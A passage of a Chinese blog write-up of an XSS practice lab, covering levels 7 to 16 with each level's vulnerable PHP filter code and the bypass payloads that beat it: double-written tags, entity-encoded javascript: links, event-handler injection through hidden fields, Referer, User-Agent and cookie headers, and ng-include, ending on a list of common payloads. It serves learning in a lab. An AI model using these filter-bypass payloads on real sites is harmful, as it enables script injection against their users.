class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这次相比上一关，把大小写过滤掉了，而且这次关键词过滤直接替换为空了，这明显是机会，之前sql注入时也遇到过这样的直接<strong>双写绕过</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">scrscriptipt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">scrscriptipt</span>&gt;</span></span><br><span class="line">&quot;&gt; <span class="tag">&lt;<span class="name">a</span> <span class="attr">hrehreff</span>=<span class="string">javasscriptcript:alert()</span>&gt;</span>x<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>源码里面也过滤掉了src，我记得src是img的一个属性，用来放图片加载链接的，访问图片会和<a>一样触发js代码</p>
+<p>至于data的话还没遇见过，抄个实例下来</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(&#x27;xss&#x27;)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="6-level8-href编码绕过"><a href="#6-level8-href编码绕过" class="headerlink" title="6.level8 href编码绕过"></a>6.level8 href编码绕过</h3><p>level8关键字尝试的时候，发现str没被过滤，那就直接闭合上图片链接</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">str</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是不行，直接上源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>发现他把”过滤掉了，换成了&amp;quot。仔细一看发现我实在有点草率，script被过滤了，javascript也不能用，直接使用图片当然不行，作为一个思路吧</p>
+<p>看了题解，发现我们可以利用链接写入js代码，虽然很多关键词被过滤掉了，但是我们能利用<strong>href的隐藏属性自动Unicode解码</strong>，我们可以插入一段js伪协议</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert()</span><br><span class="line"><span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#41;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2025/02/13/xss/image-20250218160217914.png" class="lazyload" data-srcset="/2025/02/13/xss/image-20250218160217914.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250218160217914">
+
+<h3 id="7-level9-插入指定内容绕过"><a href="#7-level9-插入指定内容绕过" class="headerlink" title="7.level9 插入指定内容绕过"></a>7.level9 插入指定内容绕过</h3><p>首先还是照常看插入点，刚开始只发现value属性有插入，但&lt;和”都被过滤，现在还没有办法解决，但发现链接中有一句话</p>
+<img src="/2025/02/13/xss/image-20250218162108302.png" class="lazyload" data-srcset="/2025/02/13/xss/image-20250218162108302.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250218162108302">
+
+<p>我猜测在链接处有过滤，直接看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str7</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>也就是说，我们的插入必须包含http:&#x2F;&#x2F;才能显示我们插入链接，结合上一关的编码绕过</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#41;</span>/* http:// */</span><br><span class="line">不知道为什么，http://放在前面不行，明明注释符也写了，但还是会被识别为链接</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-level10-隐藏传参"><a href="#8-level10-隐藏传参" class="headerlink" title="8.level10 隐藏传参"></a>8.level10 隐藏传参</h3><p>根本看不到什么东西，直接上源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们看页面源代码也发现存在三个type&#x3D;”hidden”的输入，查找后发现</p>
+<p><strong>type:”hidden”</strong></p>
+<p>隐藏域在页面中对于用户是不可见的，在表单插入中隐藏域的目的在于收集和发送信息，以利于被处理表单的程序所使用<br>注：隐藏只是在网页页面上不显示输入框，但是虽然隐藏了，还是具有form传值功能。一般用来传值，而不必让用户看到。</p>
+<p>也就是说没有输入框，但存在传值。但是这样的输入有三个，我们可以通过GET请求去传值，传到t_sort的时候发现value值有变化，于是判断隐藏传参为t_sort</p>
+<p>&lt;&gt;也被过滤掉了，我们无法直接闭合<input>标签，好在on没被过滤可以使用事件绕过</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&quot; onfocus=javascript:alert(1) type=text</span><br><span class="line">/*需要把type改为可显示的*/</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-level11-HTTP头绕过"><a href="#9-level11-HTTP头绕过" class="headerlink" title="9.level11 HTTP头绕过"></a>9.level11 HTTP头绕过</h3><p>这里的话，和10不同在于多了一个t_ref代表的是referer即上一个网址，而且还发现t_sort中”被过滤了，也就无法闭合value</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现t_sort被实体化，直接没用了，只能通过t_ref了，那也就意味着抓包改referer</p>
+<p>不知道为什么，靶场的包突然抓不了了，其他网页的包却可以抓</p>
+<p>解决了，原因未知，但网上说只要把访问ip从127.0.0.1改为192.168.84.1(本机ip)即可，试了一下果然可以抓了</p>
+<p>能抓包就简单了，和上一关一样通过referer写入即可</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&quot; onfocus=javascript:alert() type=text</span><br></pre></td></tr></table></figure>
+
+<p>后面几关就是http头的老套路，直接速通</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level12 user-agent</span><br><span class="line">&#x27;&quot; onfocus=javascript:alert() type=text</span><br></pre></td></tr></table></figure>
+
+<p>level13还是有点不同，没有直接放出来，但是看到一个t_cook的参数，决定就是它了，发现传进去的话会得到</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_cook&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;call me maybe?&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>也就是我们需要从cookie下手</p>
+<img src="/2025/02/13/xss/image-20250218205335820.png" class="lazyload" data-srcset="/2025/02/13/xss/image-20250218205335820.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250218205335820">
+
+<p>果然，直接改cookie</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&quot; onfocus=javascript:alert() type=text</span><br></pre></td></tr></table></figure>
+
+<p>level14的话，网上只有一个结果，说网站挂掉了，具体怎么挂的不知道，跑路就对了</p>
+<h3 id="10-level15-ng-include文件包含"><a href="#10-level15-ng-include文件包含" class="headerlink" title="10.level15 ng-include文件包含"></a>10.level15 ng-include文件包含</h3><p>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号</p>
+<p>查了一下，ng-include用于包含html文件，但什么都没有，直接看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>网站上什么都没有，不看源码不行啊，但是这里进行了html实体化，这个以前遇到就放弃的函数，现在来了</p>
+<p>php文件也可以被包含，我们尝试包含第一关</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&#x27;/level1.php&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以包涵第一关并让第一关弹窗（注意，这里不能包涵那些直接弹窗的东西如<script>，但是可以包涵那些标签的东西比如<a>、<input>、<img>、<p>标签等等，这些标签是能需要我们手动点击弹窗的），这里我们使用img标签，构造payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert()</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;</span><br><span class="line">?src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">d</span> <span class="attr">onerror</span>=<span class="string">javascript:alert()</span>&gt;</span>&#x27;</span><br><span class="line">各种通过触发的弹窗都可以</span><br></pre></td></tr></table></figure>
+
+<h3 id="11-level16-空格过滤"><a href="#11-level16-空格过滤" class="headerlink" title="11.level16 空格过滤"></a>11.level16 空格过滤</h3><p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;	&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>把空格和/过滤掉了，也就是我们无法直接闭合，所以那些需要闭合的标签如：</a>不能用了，我们可以尝试<img>等不需要闭合的标签，至于空格，我们之前就试过可以用回车%0a代替</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;img%0asrc=a%0aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>后面的关卡的话没什么含金量了，17，18关就是onmouse的使用，而且插件有问题，用的标签是<embed></p>
+<p>网上的说法是<strong>HTML <code>&lt;embed&gt;</code> 元素</strong>将外部内容嵌入文档中的指定位置。此内容由外部应用程序或其他交互式内容源（如浏览器插件）提供。</p>
+<p>请记住，大多数现代浏览器已经弃用并取消了对浏览器插件的支持，所以如果你希望你的网站可以在普通用户的浏览器上运行，那么依靠<embed>通常是不明智的。</p>
+<p>后面的也是插件不支持</p>
+<h3 id="5-常用插入语句"><a href="#5-常用插入语句" class="headerlink" title="5.常用插入语句"></a>5.常用插入语句</h3><p><strong>script</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span>alert(&quot;xss&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>img</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">图片加载错误时触发</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&quot;<span class="attr">alert</span>(&#x27;<span class="attr">xss</span>&#x27;)&quot;)&gt;</span></span><br><span class="line">鼠标指针移动到元素时触发</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line">鼠标指针移出时触发</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> 